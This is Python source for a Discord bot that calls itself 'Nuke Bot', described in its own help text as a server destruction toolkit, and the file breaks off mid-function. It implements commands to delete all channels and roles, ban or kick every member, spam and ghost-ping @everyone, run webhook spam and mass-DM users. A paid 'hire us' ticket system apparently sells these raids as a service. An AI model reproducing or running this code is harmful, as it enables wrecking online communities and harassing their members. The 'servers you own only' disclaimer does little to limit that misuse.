import discord
from discord.ext import commands
import asyncio
import os
import time
import datetime
import json
import aiohttp

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
START_TIME = time.time()

# ─────────────────────────────────────────────
# PERSISTENT WHITELIST
# ─────────────────────────────────────────────

MASTER_ID = 1501897844624461904
WL_FILE   = "whitelist.json"

def _load_whitelist() -> set:
    try:
        with open(WL_FILE) as f:
            data = json.load(f)
        s = set(int(x) for x in data)
    except Exception:
        s = set()
    s.add(MASTER_ID)
    return s

def _save_whitelist(wl: set):
    try:
        with open(WL_FILE, "w") as f:
            json.dump(list(wl), f)
    except Exception:
        pass

WHITELIST = _load_whitelist()

# Commands that anyone can run (no whitelist needed)
PUBLIC_COMMANDS = {"hire", "hirestatus", "hireprice"}

@bot.check
async def is_whitelisted(ctx):
    if ctx.command and ctx.command.name in PUBLIC_COMMANDS:
        return True
    if ctx.author.id in WHITELIST:
        return True
    await safe(ctx.send("❌ **You are not whitelisted to use this bot.**"))
    return False

# ─────────────────────────────────────────────
# ACTION LOGGING  (embeds only, no message spam)
# ─────────────────────────────────────────────

LOG_CHANNEL_ID: int | None = None
LOG_FILE_ENABLED = False
LOG_FILE_PATH    = "bot_log.txt"

async def _log_embed(embed: discord.Embed):
    """Send a log embed to the log channel and/or file."""
    if LOG_FILE_ENABLED:
        try:
            ts = datetime.datetime.now(datetime.UTC).strftime("%Y-%m-%d %H:%M:%S")
            line = f"[{ts}] {embed.title} — {embed.description or ''}\n"
            with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
                f.write(line)
        except Exception:
            pass
    if LOG_CHANNEL_ID:
        ch = bot.get_channel(LOG_CHANNEL_ID)
        if ch:
            try:
                await ch.send(embed=embed)
            except Exception:
                pass

def _action_embed(title: str, color: int, fields: list[tuple] | None = None,
                  footer: str | None = None) -> discord.Embed:
    """Build a clean log embed."""
    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.now(datetime.UTC))
    if fields:
        for name, value, inline in fields:
            e.add_field(name=name, value=str(value)[:1024], inline=inline)
    if footer:
        e.set_footer(text=footer)
    return e

# ── Log every command start ──
# ─────────────────────────────────────────────
# LIVE TIMER
# ─────────────────────────────────────────────

_active_timer: "LiveTimer | None" = None

class LiveTimer:
    """Sends a live-updating countdown embed to the log channel for bulk operations."""

    COLORS = [0xff0000, 0xff4500, 0xff8c00, 0xffd700, 0xadff2f, 0x57f287]

    def __init__(self, command: str, invoker: str, guild: str):
        self.command  = command
        self.invoker  = invoker
        self.guild    = guild
        self.start    = time.time()
        self.estimated: float | None = None   # set by batch() on first call
        self.total    = 0
        self.done_count = 0
        self.msg: discord.Message | None = None
        self._task: asyncio.Task | None  = None
        self.finished = False

    # Called by batch() on its first invocation for this command
    def register_batch(self, n: int, size: int, delay: float):
        if self.estimated is None and n > 0:
            batches = max(1, (n + size - 1) // size)
            self.estimated = batches * delay
            self.total = n

    def update(self, done: int):
        self.done_count = done

    def _bar(self, pct: float) -> str:
        filled = int(pct * 24)
        return "█" * filled + "░" * (24 - filled)

    def _embed(self) -> discord.Embed:
        elapsed = time.time() - self.start

        if self.estimated and self.estimated > 0:
            pct       = min(elapsed / self.estimated, 1.0)
            remaining = max(0.0, self.estimated - elapsed)
            rem_int   = max(0, int(remaining) + (1 if remaining % 1 > 0 else 0))
        else:
            pct = 1.0 if self.finished else 0.0
            remaining = rem_int = 0

        if self.finished:
            pct = 1.0

        color_idx = min(int(pct * (len(self.COLORS) - 1)), len(self.COLORS) - 1)
        color     = self.COLORS[color_idx]

        if self.finished:
            title = f"✅  `!{self.command}`  —  Done in {elapsed:.1f}s"
        elif self.estimated:
            title = f"⏱️  `!{self.command}`  —  ⏳ {rem_int}s remaining"
        else:
            title = f"⏱️  `!{self.command}`  —  Running…"

        e = discord.Embed(title=title, color=color,
                          timestamp=datetime.datetime.now(datetime.UTC))

        bar_str = f"`{self._bar(pct)}`  **{int(pct * 100)}%**"
        e.add_field(name="Progress", value=bar_str, inline=False)

        e.add_field(name="⏱ Elapsed",    value=f"`{elapsed:.1f}s`",       inline=True)

        if self.estimated and not self.finished:
            e.add_field(name="⏳ Remaining",  value=f"**`{rem_int}s`**",   inline=True)
            e.add_field(name="📊 Est. total", value=f"`{self.estimated:.1f}s`", inline=True)

        if self.total > 0:
            e.add_field(name="🔢 Items",
                        value=f"`{self.done_count} / {self.total}`", inline=True)

        e.add_field(name="👤 Invoked by", value=self.invoker, inline=True)
        e.add_field(name="🌐 Guild",      value=self.guild,   inline=True)

        if self.finished:
            e.set_footer(text=f"✅ Completed in {elapsed:.1f}s")
        else:
            e.set_footer(text="🔄 Live countdown — ticks every second")

        return e

    async def start_in_channel(self):
        if not LOG_CHANNEL_ID:
            return
        ch = bot.get_channel(LOG_CHANNEL_ID)
        if not ch:
            return
        self.msg = await safe(ch.send(embed=self._embed()))

        async def _updater():
            while not self.finished:
                await asyncio.sleep(1.0)          # ← real 1-second tick
                if self.msg and not self.finished:
                    await safe(self.msg.edit(embed=self._embed()))

        self._task = asyncio.create_task(_updater())

    async def finish(self):
        self.finished = True
        if self._task:
            self._task.cancel()
        if self.msg:
            await safe(self.msg.edit(embed=self._embed()))


@bot.before_invoke
async def _log_command_start(ctx):
    global _active_timer
    # Start a live timer for this command
    _active_timer = LiveTimer(
        command=ctx.command.name,
        invoker=f"{ctx.author} `{ctx.author.id}`",
        guild=ctx.guild.name if ctx.guild else "DM",
    )
    await _active_timer.start_in_channel()
    # Also send a static "command fired" embed
    embed = _action_embed(
        title=f"⚡ Command: `!{ctx.command.name}`",
        color=0x5865F2,
        fields=[
            ("Invoked by", f"{ctx.author} `{ctx.author.id}`", True),
            ("Channel",    f"#{ctx.channel.name}",            True),
            ("Guild",      ctx.guild.name if ctx.guild else "DM", True),
            ("Full input", f"`{ctx.message.content[:200]}`",  False),
        ],
    )
    await _log_embed(embed)

@bot.after_invoke
async def _finish_timer(ctx):
    global _active_timer
    if _active_timer:
        await _active_timer.finish()
        _active_timer = None

# ── Guild events ──
@bot.event
async def on_member_join(member):
    embed = _action_embed(
        title="📥 Member Joined",
        color=0x57f287,
        fields=[
            ("User", f"{member} `{member.id}`", True),
            ("Guild", member.guild.name, True),
            ("Account age", str((discord.utils.utcnow() - member.created_at).days) + " days", True),
        ],
    )
    await _log_embed(embed)

@bot.event
async def on_member_remove(member):
    embed = _action_embed(
        title="📤 Member Left",
        color=0xffa500,
        fields=[("User", f"{member} `{member.id}`", True), ("Guild", member.guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_member_ban(guild, user):
    embed = _action_embed(
        title="🔨 Member Banned",
        color=0xff0000,
        fields=[("User", f"{user} `{user.id}`", True), ("Guild", guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_member_unban(guild, user):
    embed = _action_embed(
        title="🔓 Member Unbanned",
        color=0x57f287,
        fields=[("User", f"{user} `{user.id}`", True), ("Guild", guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_channel_create(channel):
    embed = _action_embed(
        title="📁 Channel Created",
        color=0x00b0f4,
        fields=[
            ("Name", f"#{channel.name}", True),
            ("ID", str(channel.id), True),
            ("Guild", channel.guild.name, True),
        ],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_channel_delete(channel):
    embed = _action_embed(
        title="🗑️ Channel Deleted",
        color=0xff0000,
        fields=[
            ("Name", f"#{channel.name}", True),
            ("ID", str(channel.id), True),
            ("Guild", channel.guild.name, True),
        ],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_role_create(role):
    embed = _action_embed(
        title="🎭 Role Created",
        color=0xffa500,
        fields=[("Name", f"@{role.name}", True), ("ID", str(role.id), True), ("Guild", role.guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_role_delete(role):
    embed = _action_embed(
        title="🗑️ Role Deleted",
        color=0xff0000,
        fields=[("Name", f"@{role.name}", True), ("ID", str(role.id), True), ("Guild", role.guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_update(before, after):
    embed = _action_embed(
        title="🌐 Guild Updated",
        color=0x9b59b6,
        fields=[("Before", before.name, True), ("After", after.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_voice_state_update(member, before, after):
    b = before.channel.name if before.channel else "—"
    a = after.channel.name if after.channel else "—"
    if b == a:
        return
    embed = _action_embed(
        title="🔊 Voice State Changed",
        color=0x1abc9c,
        fields=[
            ("User", f"{member} `{member.id}`", True),
            ("From", b, True),
            ("To", a, True),
        ],
    )
    await _log_embed(embed)

# ── Log commands ──
@bot.command()
async def log(ctx, channel: discord.TextChannel = None):
    """Enable global action logging to a channel."""
    global LOG_CHANNEL_ID
    if channel is None:
        s = f"<#{LOG_CHANNEL_ID}>" if LOG_CHANNEL_ID else "disabled"
        f = "enabled" if LOG_FILE_ENABLED else "disabled"
        await ctx.send(f"📋 **Log channel:** {s}  |  **File:** {f}")
        return
    LOG_CHANNEL_ID = channel.id
    await ctx.send(f"✅ Action logging → {channel.mention}")
    embed = _action_embed("📋 Logging Started", 0x57f287,
                          [("By", f"{ctx.author}", True), ("Channel", channel.mention, True)])
    await _log_embed(embed)

@bot.command()
async def logoff(ctx):
    global LOG_CHANNEL_ID
    LOG_CHANNEL_ID = None
    await ctx.send("🔕 Action logging **disabled**.")

@bot.command()
async def logfile(ctx):
    global LOG_FILE_ENABLED
    LOG_FILE_ENABLED = not LOG_FILE_ENABLED
    state = "enabled ✅" if LOG_FILE_ENABLED else "disabled ❌"
    await ctx.send(f"📄 File logging (`{LOG_FILE_PATH}`) {state}")

@bot.command()
async def logtail(ctx, lines: int = 30):
    """Show last N lines from the log file."""
    try:
        with open(LOG_FILE_PATH, encoding="utf-8") as f:
            all_lines = f.readlines()
        tail = "".join(all_lines[-lines:]) or "(empty)"
        for chunk in [tail[i:i+1900] for i in range(0, len(tail), 1900)]:
            await safe(ctx.send(f"```\n{chunk}\n```"))
    except FileNotFoundError:
        await ctx.send("❌ No log file found. Enable with `!logfile`.")

@bot.command()
async def logclear(ctx):
    open(LOG_FILE_PATH, "w").close()
    await ctx.send("🗑️ Log file cleared.")

# ─────────────────────────────────────────────
# CORE HELPERS
# ─────────────────────────────────────────────

async def safe(coro):
    try:
        return await coro
    except Exception:
        pass

STOPPED = False

async def _run_if_not_stopped(coro):
    global STOPPED
    if STOPPED:
        return
    return await safe(coro)

async def batch(coros, size=5, delay=0.5):
    global STOPPED, _active_timer
    coros = list(coros)
    n = len(coros)

    # Register this batch with the live timer (first call wins for estimate)
    if _active_timer:
        _active_timer.register_batch(n, size, delay)

    reached = 0
    for i in range(0, n, size):
        if STOPPED:
            break
        chunk = coros[i:i + size]
        reached = i + len(chunk)
        await asyncio.gather(*[_run_if_not_stopped(c) for c in chunk])
        if _active_timer:
            _active_timer.update(reached)
        if STOPPED:
            break
        if i + size < n:
            await asyncio.sleep(delay)
            if STOPPED:
                break
    for c in coros[reached:]:
        if asyncio.iscoroutine(c):
            c.close()

async def status(ctx, action):
    try:
        await ctx.send(f"✅ `{action}` done.")
    except Exception:
        pass

@bot.command()
async def stop(ctx):
    global STOPPED
    STOPPED = True
    await ctx.send("🛑 **All operations stopped.** Use `!resume` to re-enable.")

@bot.command()
async def resume(ctx):
    global STOPPED
    STOPPED = False
    await ctx.send("▶️ **Operations resumed.**")

# ─────────────────────────────────────────────
# WHITELIST  (master only)
# ─────────────────────────────────────────────

def master_only(ctx):
    return ctx.author.id == MASTER_ID

@bot.command()
async def wladd(ctx, user_id: int):
    if not master_only(ctx):
        await ctx.send("❌ Only the master can manage the whitelist.")
        return
    WHITELIST.add(user_id)
    _save_whitelist(WHITELIST)
    e = discord.Embed(title="✅ Whitelisted", description=f"`{user_id}` added.", color=0x57f287)
    await ctx.send(embed=e)
    await _log_embed(_action_embed("🔐 Whitelist Add", 0x57f287,
                                   [("ID", str(user_id), True), ("By", str(ctx.author), True)]))

@bot.command()
async def wlremove(ctx, user_id: int):
    if not master_only(ctx):
        await ctx.send("❌ Only the master can manage the whitelist.")
        return
    if user_id == MASTER_ID:
        await ctx.send("❌ Cannot remove the master.")
        return
    WHITELIST.discard(user_id)
    _save_whitelist(WHITELIST)
    e = discord.Embed(title="🗑️ Removed", description=f"`{user_id}` removed.", color=0xff0000)
    await ctx.send(embed=e)
    await _log_embed(_action_embed("🔐 Whitelist Remove", 0xff0000,
                                   [("ID", str(user_id), True), ("By", str(ctx.author), True)]))

@bot.command()
async def wllist(ctx):
    if not master_only(ctx):
        await ctx.send("❌ Only the master can view the whitelist.")
        return
    lines = [f"`{uid}`{'  👑 *(master)*' if uid == MASTER_ID else ''}" for uid in sorted(WHITELIST)]
    e = discord.Embed(title="📋 Whitelist", description="\n".join(lines) or "*(empty)*", color=0xffd700)
    e.set_footer(text=f"{len(WHITELIST)} user(s)  •  Saved to disk permanently")
    await ctx.send(embed=e)

# Batch sizes
BATCH_MSG  = dict(size=5,  delay=1.1)
BATCH_WH   = dict(size=30, delay=0.1)
BATCH_CH   = dict(size=5,  delay=1.1)
BATCH_ROLE = dict(size=5,  delay=1.1)
BATCH_MBR  = dict(size=5,  delay=1.0)

# ─────────────────────────────────────────────
# HELP — BUTTON MENU
# ─────────────────────────────────────────────

HELP_PAGES = {
    "channels": {
        "label": "📁 Channels",
        "color": 0x00b0f4,
        "title": "📁  Channel Commands",
        "text": (
            "`!mc <name> <count>` — Mass create text channels\n"
            "`!mcv <name> <count>` — Mass create voice channels\n"
            "`!mcat <name> <count>` — Mass create categories\n"
            "`!dac` — Delete **ALL** channels\n"
            "`!datc` — Delete all text channels\n"
            "`!davc` — Delete all voice channels\n"
            "`!dacat` — Delete all categories\n"
            "`!renameall <name>` — Rename all channels\n"
            "`!lockall` — Lock all channels\n"
            "`!unlockall` — Unlock all channels\n"
            "`!hideall` — Hide all channels from @everyone\n"
            "`!showall` — Show all channels to @everyone\n"
            "`!slowall <seconds>` — Set slowmode in all channels\n"
            "`!nsfwall` — Mark all text channels NSFW\n"
            "`!unnsfwall` — Unmark NSFW on all channels\n"
            "`!topicall <topic>` — Set topic in all channels\n"
            "`!delpins` — Delete pinned messages in current channel\n"
            "`!delpinsall` — Delete pinned messages in all channels\n"
            "`!clonech <#ch> <count>` — Clone a channel multiple times\n"
            "`!cloneall` — Clone every channel\n"
            "`!archivech <#ch>` — Move channel to an Archive category\n"
            "`!movech <#ch> <#cat>` — Move channel to a category\n"
            "`!channelinfo` — List all channels with IDs\n"
            "`!vcbitrate <#vc> <bps>` — Set VC bitrate\n"
            "`!vcbitrateall <bps>` — Set bitrate on all VCs\n"
            "`!vclimit <#vc> <n>` — Set VC user limit\n"
            "`!vclimitall <n>` — Set user limit on all VCs\n"
            "`!createinvite [#ch]` — Create a permanent invite\n"
            "`!wipechat` — Delete ALL messages in current channel\n"
            "`!nuke <name> <msg>` — 💥 Holy Grail: channels + pings\n"
            "`!nukeall <name>` — Delete all channels & recreate\n"
        ),
    },
    "roles": {
        "label": "🎭 Roles",
        "color": 0xffa500,
        "title": "🎭  Role Commands",
        "text": (
            "`!mr <name> <count>` — Mass create roles\n"
            "`!dar` — Delete **ALL** roles\n"
            "`!renameallr <name>` — Rename all roles\n"
            "`!massrole <role>` — Give role to all members\n"
            "`!massremoverole <role>` — Remove role from all members\n"
            "`!stripall` — Strip all roles from all members\n"
            "`!adminrole <role>` — Give a role Administrator perms\n"
            "`!depermsall` — Wipe perms from all roles\n"
            "`!colorallr <hex>` — Change all roles color\n"
            "`!mentionallr` — Make all roles mentionable\n"
            "`!unmentionallr` — Make all roles unmentionable\n"
            "`!hoistallr` — Hoist all roles\n"
            "`!unhoistallr` — Unhoist all roles\n"
            "`!roleinfo <role>` — Detailed role info\n"
            "`!cloner <role> <name>` — Clone a role\n"
            "`!banrole <role>` — Ban all members with a role\n"
            "`!kickrole <role>` — Kick all members with a role\n"
            "`!listroles` — List all roles with IDs\n"
        ),
    },
    "members": {
        "label": "👥 Members",
        "color": 0x57f287,
        "title": "👥  Member Commands",
        "text": (
            "`!ban` — Ban **ALL** members\n"
            "`!kick` — Kick **ALL** members\n"
            "`!mban <count>` — Ban X members\n"
            "`!mkick <count>` — Kick X members\n"
            "`!massunban` — Unban all banned members\n"
            "`!banid <id>` — Ban a user by ID\n"
            "`!hackban <id>` — Ban a user not in server\n"
            "`!softban <user>` — Ban+unban (clears messages)\n"
            "`!banrole <role>` — Ban all with a role\n"
            "`!kickrole <role>` — Kick all with a role\n"
            "`!massdeafen` — Deafen all voice members\n"
            "`!massmute` — Mute all voice members\n"
            "`!undeafenall` — Undeafen all voice members\n"
            "`!unmuteall` — Unmute all voice members\n"
            "`!massmove <#vc>` — Move all voice members\n"
            "`!voicekick` — Disconnect all voice members\n"
            "`!nickall <nick>` — Change all nicknames\n"
            "`!massnick <role> <nick>` — Nick all with a role\n"
            "`!resetnicks` — Reset all nicknames\n"
            "`!timeoutall <minutes>` — Timeout all members\n"
            "`!untimeoutall` — Remove all timeouts\n"
            "`!userinfo <user>` — Detailed user info\n"
            "`!joinedafter <days>` — Members who joined in last X days\n"
            "`!jointime <user>` — When a user joined\n"
            "`!membercount` — Member count breakdown\n"
            "`!listbans` — List all banned users\n"
        ),
    },
    "massdm": {
        "label": "📩 Mass DM",
        "color": 0xff69b4,
        "title": "📩  Mass DM Commands",
        "text": (
            "`!dmall <msg>` — DM all members\n"
            "`!massdmrole <role> <msg>` — DM all with a role\n"
            "`!massdmnonrole <role> <msg>` — DM all WITHOUT a role\n"
            "`!massdmnew <days> <msg>` — DM members who joined in last X days\n"
            "`!massdmids <id,id,...> <msg>` — DM specific user IDs\n"
            "`!massdmbots <msg>` — DM all bot accounts\n"
            "`!massdmoffline <msg>` — DM all offline members\n"
            "`!massdmonline <msg>` — DM all online members\n"
            "`!massdmnoavatar <msg>` — DM members with default avatar\n"
            "`!dmallroles <msg>` — DM every role holder (no dupes)\n"
            "`!dmowner <msg>` — DM the server owner\n"
            "`!dmrepeat <user> <count> <msg>` — DM one user X times\n"
            "`!dmembed <user> <title> | <body>` — DM an embed to a user\n"
        ),
    },
    "messaging": {
        "label": "💬 Messaging",
        "color": 0xeb459e,
        "title": "💬  Messaging Commands",
        "text": (
            "`!mcp <name> <count> <pings> <msg>` — Create channels + ping\n"
            "`!spam <count> <msg>` — Spam in current channel\n"
            "`!spamall <count> <msg>` — Spam in ALL channels\n"
            "`!pingall <count>` — @everyone X times in all channels\n"
            "`!pingr <role> <count>` — Ping a role X times in all channels\n"
            "`!massping <user> <count>` — Ping one user X times\n"
            "`!ghostping <count>` — Ghost ping @everyone here\n"
            "`!ghostpingall <count>` — Ghost ping @everyone in ALL channels\n"
            "`!tts <msg>` — TTS in current channel\n"
            "`!ttsall <msg>` — TTS in ALL channels\n"
            "`!embedspam <count> <title> | <body>` — Spam embed here\n"
            "`!embedall <title> | <body>` — Send embed to ALL channels\n"
            "`!announce <msg>` — Announce to all channels as embed\n"
            "`!say <#ch> <msg>` — Send message to a specific channel\n"
            "`!purge <count>` — Purge messages here\n"
            "`!purgeall <count>` — Purge messages in ALL channels\n"
            "`!purgebots <count>` — Purge bot messages here\n"
            "`!purgeuser <user> <count>` — Purge a user's messages here\n"
            "`!wipechat` — Purge ALL messages in current channel\n"
            "`!pin <msg_id>` — Pin a message by ID\n"
            "`!react <msg_id> <emoji>` — React to a message\n"
            "`!reactall <emoji>` — React to last msg in every channel\n"
            "`!countdown <n> <msg>` — Countdown then message\n"
            "`!forwardall <#src> <#dest>` — Forward msgs to another channel\n"
            "`!wspam <count> <msg>` — ⚡ Webhook spam here\n"
            "`!wspamall <count> <msg>` — ⚡ Webhook spam in ALL channels\n"
            "`!whnuke <name> <count> <pings> <msg>` — ⚡ Webhook nuke\n"
        ),
    },
    "server": {
        "label": "🌐 Server",
        "color": 0x9b59b6,
        "title": "🌐  Server Commands",
        "text": (
            "`!renameserver <name>` — Rename the server\n"
            "`!icon <url>` — Change server icon\n"
            "`!banner <url>` — Change server banner\n"
            "`!description <text>` — Change server description\n"
            "`!setverification <0-4>` — Set verification level\n"
            "`!setfilter <0-2>` — Set explicit content filter\n"
            "`!setnotifications <0-1>` — Default notification level\n"
            "`!setafk <#vc>` — Set AFK voice channel\n"
            "`!setafktimeout <seconds>` — Set AFK timeout\n"
            "`!das` — Delete all stickers\n"
            "`!delemojis` — Delete all custom emojis\n"
            "`!addemoji <name> <url>` — Add emoji from URL\n"
            "`!massemoji <name> <url> <count>` — Add emoji N times\n"
            "`!delthreads` — Delete all threads\n"
            "`!delwebhooks` — Delete all webhooks\n"
            "`!delinvites` — Delete all invites\n"
            "`!listinvites` — List active invites\n"
            "`!webhook <name> <count>` — Mass-create webhooks\n"
            "`!audit <count>` — Recent audit log entries\n"
            "`!serverinfo` — Server info embed\n"
            "`!vanity` — Show vanity URL\n"
            "`!inviteme` — Generate bot invite link\n"
            "`!everything` — ☢️ Run ALL nuke commands\n"
        ),
    },
    "logging": {
        "label": "📋 Logging",
        "color": 0x1abc9c,
        "title": "📋  Logging Commands",
        "text": (
            "`!log [#channel]` — Enable action logging to a channel\n"
            "`!logoff` — Disable channel logging\n"
            "`!logfile` — Toggle logging to `bot_log.txt`\n"
            "`!logtail [lines]` — Show last N lines from log file\n"
            "`!logclear` — Clear the log file\n\n"
            "**What gets logged:**\n"
            "Every command invoked (who, where, args)\n"
            "Member joins / leaves\n"
            "Bans / unbans\n"
            "Channel creates / deletes\n"
            "Role creates / deletes\n"
            "Guild renames\n"
            "Voice channel moves\n"
            "DM results (sent/failed counts)\n"
            "All bulk action results\n"
        ),
    },
    "bot": {
        "label": "🤖 Bot",
        "color": 0xffd700,
        "title": "🤖  Bot Control Commands",
        "text": (
            "`!ping` — Bot latency\n"
            "`!uptime` — How long the bot has been running\n"
            "`!botstatus <text>` — Change bot status\n"
            "`!botname <name>` — Change bot username\n"
            "`!botavatar <url>` — Change bot avatar\n"
            "`!activity <type> <text>` — Set activity (playing/watching/listening/streaming)\n"
            "`!guilds` — List all guilds the bot is in\n"
            "`!cmdcount` — Total command count\n"
            "`!stop` — 🛑 Stop all running operations\n"
            "`!resume` — ▶️ Resume operations\n"
        ),
    },
    "whitelist": {
        "label": "🔐 Whitelist",
        "color": 0x2f3136,
        "title": "🔐  Whitelist  *(master only)*",
        "text": (
            "`!wladd <user_id>` — Add user to whitelist\n"
            "`!wlremove <user_id>` — Remove user from whitelist\n"
            "`!wllist` — Show all whitelisted users\n\n"
            "Only the master 👑 can run these commands.\n"
            "Non-whitelisted users are blocked from **all** commands.\n"
            "✅ **Whitelist is saved to disk — persists through restarts.**\n"
            f"Master ID: `{MASTER_ID}`"
        ),
    },
    "modmail": {
        "label": "📩 ModMail",
        "color": 0xeb459e,
        "title": "📩  ModMail Panel",
        "text": (
            "**Anyone can DM the bot** to reach staff.\n\n"
            "**What happens when someone DMs:**\n"
            "• They receive an interactive welcome menu\n"
            "• Staff see the message + user info in the log channel\n"
            "• Staff reply or block directly from the log embed\n\n"
            "**Log channel buttons:**\n"
            "✉️ **Reply** — Opens a modal, bot DMs user your reply\n"
            "🚫 **Block User** — Stops all future DMs from that user\n\n"
            "**DM menu buttons (what users see):**\n"
            "🔥 **Hire Us** — Opens the hire request form\n"
            "💰 **Pricing** — Shows current tier prices\n"
            "❓ **Support** — Notifies staff of a support request\n"
        ),
    },
    "hire": {
        "label": "🎫 Hire",
        "color": 0xff4500,
        "title": "🎫  Hire & Ticket System",
        "text": (
            "**Public (anyone):**\n"
            "`!hire` — Open hire request form\n"
            "`!hireprice` — Show current pricing\n"
            "`!hirestatus <id>` — Check your ticket status\n\n"
            "**Staff (whitelist):**\n"
            "`!hiresetup [#ch]` — Set fallback log channel *(master)*\n"
            "`!setprice <tier> <amt>` — Update a tier price\n"
            "`!hirelist` — List all tickets\n"
            "`!hireinfo <id>` — Full ticket details\n"
            "`!hireaccept <id>` — Accept & notify client\n"
            "`!hiredeny <id> [reason]` — Deny & notify client\n"
            "`!hireclose <id>` — Close completed ticket\n"
            "`!hirenote <id> <note>` — Add staff note\n"
            "`!hirecancel <id>` — Cancel a ticket\n"
            "`!hirearch` — View archived tickets\n"
            "`!hiredmclient <id> <msg>` — DM client directly\n\n"
            "**Auto:** Each submission creates its own channel\n"
            "inside the `🎫 Hire Tickets` category with\n"
            "Accept · Deny · Close · Note · DM buttons."
        ),
    },
}

class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=120)
        self.current = "channels"
        keys = list(HELP_PAGES.keys())
        # Dynamically distribute buttons across rows (max 5 per row per Discord UI limits)
        for index, key in enumerate(keys):
            row = index // 5
            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=row))

    def get_embed(self, page_key: str) -> discord.Embed:
        page = HELP_PAGES[page_key]
        e = discord.Embed(title=page["title"], description=page["text"], color=page["color"])
        e.set_footer(text="Nuke Bot  •  prefix: !  •  Click a button to switch category")
        return e

class HelpButton(discord.ui.Button):
    def __init__(self, key: str, label: str, row: int):
        super().__init__(label=label, style=discord.ButtonStyle.secondary, row=row)
        self.key = key

    async def callback(self, interaction: discord.Interaction):
        view: HelpView = self.view
        # Highlight active button
        for child in view.children:
            if isinstance(child, HelpButton):
                child.style = (
                    discord.ButtonStyle.primary
                    if child.key == self.key
                    else discord.ButtonStyle.secondary
                )
        await interaction.response.edit_message(embed=view.get_embed(self.key), view=view)

@bot.command()
async def help(ctx):
    view = HelpView()
    header = discord.Embed(
        title="💥  N U K E  B O T",
        description=(
            "**The ultimate server destruction toolkit.**\n"
            "Click a category button below to explore commands.\n"
            "Use `!stop` at any time to halt all operations."
        ),
        color=0xff0000,
    )
    header.set_image(url="https://media.tenor.com/R2aRkFNFMFMAAAAC/explosion-nuke.gif")
    header.set_footer(text="⚠️  Use responsibly — for servers you own only.")
    # Send header, then button menu
    await ctx.send(embed=header)
    await ctx.send(embed=view.get_embed("channels"), view=view)

# ─────────────────────────────────────────────
# CHANNELS
# ─────────────────────────────────────────────

@bot.command()
async def mc(ctx, name: str, count: int):
    await batch([ctx.guild.create_text_channel(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mc {name} x{count}")
    await _log_embed(_action_embed("📁 Mass Create Channels", 0x00b0f4,
        [("Name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def mcv(ctx, name: str, count: int):
    await batch([ctx.guild.create_voice_channel(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mcv {name} x{count}")
    await _log_embed(_action_embed("🔊 Mass Create Voice Channels", 0x00b0f4,
        [("Name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def mcat(ctx, name: str, count: int):
    await batch([ctx.guild.create_category(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mcat {name} x{count}")
    await _log_embed(_action_embed("📂 Mass Create Categories", 0x00b0f4,
        [("Name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def dac(ctx):
    count = len(ctx.guild.channels)
    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "dac")
    await _log_embed(_action_embed("🗑️ Deleted ALL Channels", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def datc(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.delete() for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "datc")
    await _log_embed(_action_embed("🗑️ Deleted All Text Channels", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def davc(ctx):
    count = len(ctx.guild.voice_channels)
    await batch([ch.delete() for ch in ctx.guild.voice_channels], **BATCH_CH)
    await status(ctx, "davc")
    await _log_embed(_action_embed("🗑️ Deleted All Voice Channels", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def dacat(ctx):
    count = len(ctx.guild.categories)
    await batch([cat.delete() for cat in ctx.guild.categories], **BATCH_CH)
    await status(ctx, "dacat")
    await _log_embed(_action_embed("🗑️ Deleted All Categories", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def renameall(ctx, *, name: str):
    count = len(ctx.guild.channels)
    await batch([ch.edit(name=name) for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, f"renameall {name}")
    await _log_embed(_action_embed("✏️ Renamed All Channels", 0x00b0f4,
        [("New name", name, True), ("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def lockall(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.set_permissions(ctx.guild.default_role, send_messages=False)
                 for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "lockall")
    await _log_embed(_action_embed("🔒 Locked All Channels", 0xff0000,
        [("Channels locked", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unlockall(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.set_permissions(ctx.guild.default_role, send_messages=True)
                 for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "unlockall")
    await _log_embed(_action_embed("🔓 Unlocked All Channels", 0x57f287,
        [("Channels unlocked", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def hideall(ctx):
    count = len(ctx.guild.channels)
    await batch([ch.set_permissions(ctx.guild.default_role, view_channel=False)
                 for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "hideall")
    await _log_embed(_action_embed("🙈 Hidden All Channels", 0xff0000,
        [("Channels hidden", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def showall(ctx):
    count = len(ctx.guild.channels)
    await batch([ch.set_permissions(ctx.guild.default_role, view_channel=True)
